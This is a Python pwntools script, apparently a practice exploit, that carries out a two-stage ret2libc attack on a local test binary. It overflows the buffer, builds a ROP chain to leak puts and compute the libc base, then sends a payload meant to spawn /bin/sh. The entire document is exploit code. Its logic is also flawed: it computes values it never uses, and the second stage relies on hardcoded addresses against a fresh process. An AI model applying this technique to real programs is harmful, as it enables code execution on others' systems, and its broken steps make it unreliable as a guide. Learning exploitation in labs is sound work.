from pwn import *

# 기본 세팅
p = process('./ret2libc_test', stdin=PTY, stdout=PTY)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

pop_rdi = 0x4012c3
ret = 0x40101a
puts_got = 0x404018
puts_plt = 0x401070
main_addr = 0x401225 

# 1차: puts leak
p = process('./ret2libc_test', stdin=PTY, stdout=PTY)
payload = b"A"*64 + b"B"*8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)

p.sendlineafter("Input: ", payload)
leaked_puts = u64(p.recv(6).ljust(8, b"\x00"))
log.success(f"Leaked puts: {hex(leaked_puts)}")

# libc base 계산
libc_base = leaked_puts - libc.symbols['puts']

# 문자열 위치를 payload 끝에 삽입
# 우리는 RSP+offset 구조로 직접 넣으므로 주소 계산이 필요해
# 또는 그냥 정확히 지정된 주소에 문자열 넣어도 됨
binsh_addr = 0x7fffffffdcf0  # ← GDB로 맞춰야 정확

log.info(f"libc base: {hex(libc_base)}")

# 2차 페이로드
payload2 = b"A"*64 + b"B"*8
payload2 += p64(ret)
payload2 += p64(pop_rdi)
payload2 += p64(0x7fffffffdce8) 
payload2 += p64(0x7ffff7e1d290)
payload2 += b"/bin/sh\x00"

with open("payload2", "wb") as f:
    f.write(payload2)

# 2차 실행
p = process('./ret2libc_test', stdin=PTY, stdout=PTY)
p.sendlineafter("Input: ", payload2)
p.interactive()
